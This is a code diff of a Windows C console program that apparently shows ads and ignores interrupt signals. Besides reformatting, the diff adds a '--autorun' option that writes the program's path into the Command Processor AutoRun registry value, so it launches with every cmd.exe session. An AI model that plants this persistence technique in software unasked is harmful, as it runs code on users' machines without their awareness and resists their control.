@@ -30,19 +30,19 @@ int gotoxy(HANDLE hConsole, int x, int y)
 int TokLastPos(char *s, const char *token)
 {
 
-	int lastpos = -1;
-	if (!s || !token)
-		return lastpos;
-	
-	for (int i = 0; i < strlen(s); i++)
-	{
-		for (int j = 0; j < strlen(token); j++)
-		{
-			if (s[i] == token[j])
-				lastpos = i;
-		}
-	}
-	return lastpos;
+    int lastpos = -1;
+    if (!s || !token)
+        return lastpos;
+
+    for (int i = 0; i < strlen(s); i++)
+    {
+        for (int j = 0; j < strlen(token); j++)
+        {
+            if (s[i] == token[j])
+                lastpos = i;
+        }
+    }
+    return lastpos;
 }
 
 char *get_path_directory(char *path, char *dest) // Not a WinAPI function
@@ -238,13 +238,15 @@ int main(int argc, char *argv[])
     if (argc > 1)
         ad_tier_arg = atoi(argv[1]);
     SetConsoleCtrlHandler(NULL, TRUE);
-    char *exec_name = calloc((MAX_PATH + 1) * 2, sizeof(TCHAR));
+
+    char *exec_name = calloc((MAX_PATH + 1) * 2, sizeof(TCHAR)); // Get the current path and directory of the executable
     GetModuleFileName(NULL, exec_name, MAX_PATH * 2);
+    char *new_dir = calloc(MAX_PATH * 2, sizeof(char));
+    get_path_directory(exec_name, new_dir);
+    SetCurrentDirectory(new_dir);
+
     if (argc > 1 && strcmp(argv[1], argn) == 0)
     {
-        char* new_dir = calloc(MAX_PATH*2, sizeof(char));
-        get_path_directory(exec_name, new_dir);
-        SetCurrentDirectory(new_dir);
 
         if (argc > 2)
             ad_tier_arg = atoi(argv[2]);
@@ -257,6 +259,20 @@ int main(int argc, char *argv[])
         show_ads();
         signal(SIGINT, SIG_IGN);
         signal(SIGABRT, SIG_IGN);
+    }
+    else if (argc > 1 && strcmp(argv[1], "--autorun") == 0)
+    {
+
+        HKEY hKey;
+        if (exec_name && RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Command Processor", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS)
+        {
+            RegSetValueEx(hKey, "AutoRun", 0, REG_SZ, (const BYTE *)exec_name, strlen(exec_name));
+            RegCloseKey(hKey);
+        }
+        else
+        {
+            fprintf(stderr, "Error creating registry key (%lu).\n", GetLastError());
+        }
     }
     else
     {
